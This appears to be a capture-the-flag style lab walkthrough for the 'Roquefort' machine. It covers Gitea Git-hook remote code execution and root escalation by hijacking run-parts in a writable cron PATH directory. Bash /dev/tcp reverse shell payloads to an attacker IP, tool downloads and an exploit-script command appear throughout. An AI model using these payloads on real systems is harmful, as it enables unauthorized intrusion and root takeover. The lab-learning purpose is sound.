# Roquefort — Proving Grounds

> [!abstract] Summary
> Roquefort is a Linux machine running **Gitea 1.7.5** on port 3000, alongside FTP (ProFTPD 1.3.5b), SSH, and nginx. The foothold is through **Gitea's authenticated RCE** — after registering a new account, we create a repository and inject a reverse shell into a **Git Hook** (pre-receive or post-receive). Pushing a commit triggers the hook and returns a shell as the `chloe` user. Privilege escalation abuses a **writable `/usr/local/bin`** directory that sits in root's cron PATH: placing a malicious `run-parts` binary there causes it to be executed as root when the cron job fires.

**Target:** `192.168.154.67`

## Methodology

1. Full TCP port scan — identify FTP (21), SSH (22), nginx (80), Dropbear SSH (2222), Gitea (3000).
2. Browse Gitea on port 3000, register a new account.
3. Create a repository and add a reverse shell payload to the **Git Hooks** (pre-receive hook).
4. Push a commit to trigger the hook → shell as `chloe`.
5. Enumerate with LinPEAS — discover writable `/usr/local/bin` in root's cron PATH.
6. Create a malicious `run-parts` script in `/usr/local/bin` → root shell.

> [!note] Exploit Background
> Gitea versions up to 1.7.5 are vulnerable to authenticated RCE via Git Hooks (related to CVE-2019-11229). When a user has permission to create Git hooks, they can inject arbitrary shell commands into pre-receive, post-receive, or update hooks. Pushing a commit to the repository triggers the hook, executing the payload with the Gitea process's OS privileges. In versions before 1.13.0, `DISABLE_GIT_HOOKS` defaults to `false`, meaning any admin-level user can create hooks.

## Initial Foothold

### Register a Gitea Account

Gitea has open registration enabled. Navigate to:
```
http://192.168.154.67:3000/user/sign_up
```

Register a new account (any username/password will work):
```
Username: testuser
Email: test@test.com
Password: Password123!
```

### Create a Repository

After logging in, create a new repository:

1. Click **"+"** → **"New Repository"**
2. Name it anything (e.g., `exploit`)
3. Check **"Initialize this repository"** so there's a commit to work with
4. Click **"Create Repository"**

### Inject Reverse Shell via Git Hooks

Navigate to the repository settings:
```
http://192.168.154.67:3000/testuser/exploit/settings/hooks
```

Go to **Settings** → **Git Hooks** → **pre-receive** → click the **pencil icon** to edit.

Paste the following reverse shell payload into the hook content:

```bash
#!/bin/bash
bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1
```

Replace `YOUR_KALI_IP` with your tun0 VPN IP:
```
ip addr show tun0 | grep inet | head -1
```

Click **"Update Hook"**.

### Trigger the Hook

Start a listener on Kali:
```
nc -lvnp 4444
```

Now trigger the hook by pushing a commit. Clone the repo locally, make a change, and push:

```
git clone http://192.168.154.67:3000/testuser/exploit.git
cd exploit
echo "trigger" >> README.md
git add .
git commit -m "trigger hook"
git push origin master
```

> [!tip] Alternative: Using the Exploit Script
> Instead of the manual Git Hooks approach, you can use the EDB-49383 exploit script which automates the process:
> ```
> python3 49383.py -t http://192.168.154.67:3000 -u testuser -p 'Password123!' -I YOUR_KALI_IP -P 4444
> ```
> The script handles repository creation, hook injection, and triggering automatically.

The push triggers the pre-receive hook. Check the listener — a reverse shell should connect:

```

```

```

```

> The Gitea hook shell may be unstable. For a more reliable session, generate an SSH key pair on Kali and add the public key to `/home/chloe/.ssh/authorized_keys`, then SSH in directly.

## Privilege Escalation

### Enumeration

Check sudo permissions:
```

```

No sudo permissions available.

Transfer and run LinPEAS for automated enumeration:
```
# On Kali — serve LinPEAS
python3 -m http.server 8080

# On target
cd /tmp
wget http://YOUR_KALI_IP:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

> [!tip] If curl/wget Not Available
> If the target doesn't have `curl` or `wget`, use the Dropbear SSH on port 2222 or transfer via the Gitea repository itself.

### Writable /usr/local/bin — Cron PATH Abuse

LinPEAS reveals a critical finding: the directory `/usr/local/bin` is **world-writable**:

```
ls -la /usr/local/bin
```

Check for cron jobs:
```
cat /etc/crontab
```

The system crontab includes `/usr/local/bin` in the PATH, and a cron job runs `run-parts` periodically (typically via `/etc/cron.hourly` or `/etc/cron.d`). Since `/usr/local/bin` appears **before** the system directories in the PATH, a malicious binary placed there takes precedence.

> [!note] Cron PATH Abuse
> When cron runs a job that calls `run-parts` (the program that executes scripts in `/etc/cron.hourly`, `/etc/cron.daily`, etc.), it searches the PATH in order. If we can write to a directory early in the PATH (like `/usr/local/bin`), we can place a fake `run-parts` there. Cron will execute our version instead of the real one at `/usr/bin/run-parts`.

Optionally, use `pspy` to confirm the cron execution:
```
# On Kali
python3 -m http.server 8080

# On target
cd /tmp
wget http://YOUR_KALI_IP:8080/pspy64
chmod +x pspy64
./pspy64
```

Watch for root executing `run-parts` via the cron system.

### Create Malicious run-parts

Start a listener on Kali:
```
nc -lvnp 5555
```

On the target, create the malicious `run-parts` in `/usr/local/bin`:
```
cat > /usr/local/bin/run-parts << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_KALI_IP/5555 0>&1
EOF
chmod +x /usr/local/bin/run-parts
```

Now wait for the cron job to fire. This may take up to 60 minutes depending on the cron schedule, but typically triggers within a few minutes on PG Practice machines.

When the cron job executes, it will run our malicious `run-parts` as root, and a shell will connect to the listener:

```
connect to [YOUR_KALI_IP] from (UNKNOWN) [192.168.154.67] 43210
root@roquefort:~#
```

## Lessons Learned

| Stage | Technique | Takeaway |
|-------|-----------|----------|
| Enumeration | Nmap full port scan | Gitea on a non-standard port (3000) is the real attack surface |
| Foothold | Gitea Git Hooks RCE | Authenticated Gitea users with hook permissions can inject arbitrary commands |
| Foothold | Open registration | Always check if web applications allow self-registration |
| Privilege Escalation | Writable PATH directory | `/usr/local/bin` being world-writable + early in cron's PATH = trivial root |
| Privilege Escalation | Cron PATH hijacking | `run-parts` is a prime target since cron uses it to run periodic scripts |

> [!tip] Key OSCP Lessons
> 1. **Always check non-standard ports** — Gitea on 3000 was the entire foothold, not FTP or nginx.
> 2. **Git Hooks are a powerful RCE vector** — any Git hosting platform (Gitea, GitLab, Gogs) with hook access can be abused.
> 3. **World-writable directories in cron's PATH** are a classic Linux privesc — always check `ls -la /usr/local/bin` and `cat /etc/crontab`.
> 4. **pspy** is invaluable for spotting cron jobs when you can't read crontab files.
> 5. The shell from Git hooks can be unstable — always stabilize or add SSH keys.
